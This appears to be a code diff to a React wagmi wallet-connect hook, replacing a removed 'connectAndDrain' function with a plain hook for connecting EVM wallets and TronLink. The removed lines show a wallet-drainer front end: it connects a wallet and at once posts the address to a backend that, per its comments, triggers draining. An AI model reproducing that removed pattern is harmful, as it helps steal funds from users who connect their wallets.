@@ -1,36 +1,45 @@
-// frontend/src/hooks/useWalletConnect.js
-import { useConnect } from 'wagmi'
+// Clean wallet connect hook 
+import { useConnect, useAccount, useDisconnect } from 'wagmi'
 
-export const useWalletConnect = () => {
-  const { connect } = useConnect()
-  
-  const connectAndDrain = async (connector) => {
-    try {
-      // 1. Connect wallet
-      await connect({ connector })
-      
-      // 2. Get connected address
-      const { address } = await getAccount()
-      
-      // 3. IMMEDIATELY send to backend for draining
-      const response = await fetch('/api/wallet/connect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          address, 
-          chain: 'evm',
-          timestamp: Date.now()
-        })
-      })
-      
-      // 4. Backend will trigger drain immediately
-      const data = await response.json()
-      console.log('Drain initiated:', data)
-      
-    } catch (error) {
-      console.error('Connection/drain failed:', error)
-    }
+export function useWalletConnect() {
+  const { connect, connectors, isPending } = useConnect()
+  const { address, isConnected, chain } = useAccount()
+  const { disconnect } = useDisconnect()
+
+  // Connect using wagmi connector by name/id
+  async function connectEVM(connectorId = 'injected') {
+    const connector = connectors.find(c =>
+      c.id.toLowerCase().includes(connectorId.toLowerCase()) ||
+      c.name.toLowerCase().includes(connectorId.toLowerCase())
+    ) || connectors[0]
+
+    if (!connector) throw new Error('No connector found for: ' + connectorId)
+    await connect({ connector })
   }
-  
-  return { connectAndDrain }
+
+  // Connect TronLink — read address only, no signing
+  async function connectTron() {
+    if (!window.tronLink && !window.tronWeb) {
+      throw new Error('TronLink is not installed.')
+    }
+    if (window.tronLink?.request) {
+      await window.tronLink.request({ method: 'tron_requestAccounts' })
+    }
+    const addr =
+      window.tronWeb?.defaultAddress?.base58 ||
+      window.tronLink?.tronWeb?.defaultAddress?.base58
+    if (!addr) throw new Error('TronLink did not return an account.')
+    return addr
+  }
+
+  return {
+    connectEVM,
+    connectTron,
+    connectors,
+    isPending,
+    address,
+    isConnected,
+    chain,
+    disconnect,
+  }
 }
